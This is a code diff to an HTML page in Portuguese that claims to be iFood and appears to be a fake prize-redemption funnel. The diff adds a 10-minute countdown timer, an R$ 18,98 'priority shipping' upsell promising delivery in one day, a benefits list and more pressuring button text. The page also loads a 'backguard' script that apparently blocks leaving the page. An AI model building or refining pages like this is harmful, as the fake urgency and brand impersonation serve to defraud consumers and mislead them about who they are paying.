@@ -13,7 +13,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="style.css?v=3.1">
+    <link rel="stylesheet" href="style.css?v=3.2">
     <script src="/backguard.js?v=1.1"></script>
     <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
         data-utmify-prevent-subids async defer></script>
@@ -46,6 +46,30 @@
             <h2 class="upsell-title">Sua bag ja entrou na fila de envio, <span id="upsell-lead-name">parceiro</span>.</h2>
             <p class="upsell-subtitle">Devido ao alto volume de resgates, o prazo padrao foi ampliado para ate 17 dias.</p>
 
+            <div class="upsell-urgency" id="upsell-urgency">
+                <div class="upsell-urgency__left">
+                    <strong>Liberado agora: prioridade de envio</strong>
+                    <span>Janela promocional expira em <b id="upsell-timer">10:00</b></span>
+                </div>
+                <div class="upsell-urgency__price">
+                    <span>Taxa unica</span>
+                    <strong>R$ 18,98</strong>
+                </div>
+            </div>
+
+            <div class="upsell-delivery-grid" id="upsell-delivery-grid">
+                <article class="upsell-delivery-card">
+                    <span class="upsell-delivery-card__label">Prazo atual</span>
+                    <strong>Ate 17 dias</strong>
+                    <small>Fila padrao de expedicao</small>
+                </article>
+                <article class="upsell-delivery-card upsell-delivery-card--priority">
+                    <span class="upsell-delivery-card__label">Com prioridade</span>
+                    <strong>Recebe em 1 dia</strong>
+                    <small>Despacho no proximo lote</small>
+                </article>
+            </div>
+
             <div class="upsell-summary">
                 <div class="upsell-summary__row">
                     <span>Frete atual</span>
@@ -61,11 +85,19 @@
                 </div>
             </div>
 
-            <div class="upsell-image-slot" id="upsell-image-slot" aria-label="Area reservada para imagem"></div>
+            <div class="upsell-image-slot" id="upsell-image-slot" aria-label="Area reservada para imagem">
+                <span class="upsell-image-slot__hint">Area reservada para imagem do adiantamento de frete</span>
+            </div>
+
+            <ul class="upsell-benefits" id="upsell-benefits">
+                <li>Fila prioritaria de separacao da sua bag</li>
+                <li>Atualizacao de rastreio no mesmo dia</li>
+                <li>Entrega acelerada sem perder a reserva</li>
+            </ul>
 
             <div class="action-stack">
-                <button id="btn-upsell-accept" class="btn-primary" type="button">Adiantar entrega por R$ 18,98</button>
-                <button id="btn-upsell-skip" class="btn-secondary" type="button">Manter prazo atual</button>
+                <button id="btn-upsell-accept" class="btn-primary" type="button">Quero receber em 1 dia por R$ 18,98</button>
+                <button id="btn-upsell-skip" class="btn-secondary" type="button">Continuar com prazo padrao</button>
             </div>
 
             <div id="upsell-loading" class="inline-loading hidden" aria-hidden="true">
@@ -96,7 +128,7 @@
         <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
     </footer>
 
-    <script src="script.js?v=5.8" defer></script>
+    <script src="script.js?v=5.9" defer></script>
 </body>
 
 </html>
